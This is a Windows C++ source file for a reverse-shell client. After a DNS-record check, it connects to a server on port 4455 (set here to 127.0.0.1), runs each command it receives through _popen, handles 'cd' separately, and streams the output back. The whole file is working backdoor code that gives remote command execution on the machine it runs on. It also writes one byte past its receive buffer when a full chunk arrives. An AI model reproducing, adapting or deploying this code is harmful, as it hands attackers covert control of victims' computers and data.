#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#include "common.h"
#include "checkDns.h"
#define MAX_SIZE 10042

std::string currentDirectory = ".";


int main() {
    
    if (checkDnsRecord() == true) {

        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed!" << std::endl;
            return 1;
        }

        SOCKET connection_type = socket(AF_INET, SOCK_STREAM, 0);

        if (connection_type == INVALID_SOCKET) {
            std::cerr << "Socket creation failed!" << std::endl;
            WSACleanup();
            return 1;
        }

        sockaddr_in server_address;
        server_address.sin_family = AF_INET;
        server_address.sin_addr.s_addr = inet_addr("127.0.0.1");
        server_address.sin_port = htons(4455);

        if (connect(connection_type, (SOCKADDR*)&server_address, sizeof(server_address)) == SOCKET_ERROR) {
            std::cerr << "Connection failed!" << std::endl;
            closesocket(connection_type);
            WSACleanup();
            return 1;
        }

        char* buf;
        buf = (char*)malloc(MAX_SIZE);;
        int receiveData;

        do {
            receiveData = recv(connection_type, buf, MAX_SIZE, 0);

            if (receiveData > 0) {
                // Null-terminate the received data to treat it as a string
                buf[receiveData] = '\0';

                if (strncmp(buf, "cd ", 3) == 0) {
                    // Handle "cd" command
                    std::string newDirectory = buf + 3; // Extract the directory path after "cd "
                    newDirectory = newDirectory.substr(0, newDirectory.find_first_of("\r\n"));

                    // Use SetCurrentDirectoryA for narrow characters
                    if (SetCurrentDirectoryA(newDirectory.c_str())) {
                        currentDirectory = newDirectory;
                        send(connection_type, ("Changed directory to " + currentDirectory + "\n").c_str(),
                            strlen(("Changed directory to " + currentDirectory + "\n").c_str()), 0);
                    }
                    else {
                        send(connection_type, ("Failed to change directory to " + newDirectory + "\n").c_str(),
                            strlen(("Failed to change directory to " + newDirectory + "\n").c_str()), 0);
                    }
                }

                else {
                    // Execute the received command and send its output back to the server
                    FILE* command_output = _popen(buf, "r");
                    if (command_output) {
                        char command_buf[1024];
                        while (fgets(command_buf, sizeof(command_buf), command_output)) {
                            send(connection_type, command_buf, strlen(command_buf), 0);
                        }
                        _pclose(command_output);
                    }
                }
            }
            else if (receiveData == 0) {
                printf("Connection closed by the server\n");
            }
            else {
                printf("recv failed: %d\n", WSAGetLastError());
            }

        } while (receiveData > 0);

        closesocket(connection_type);
        WSACleanup();
    }

    return 0;

}
	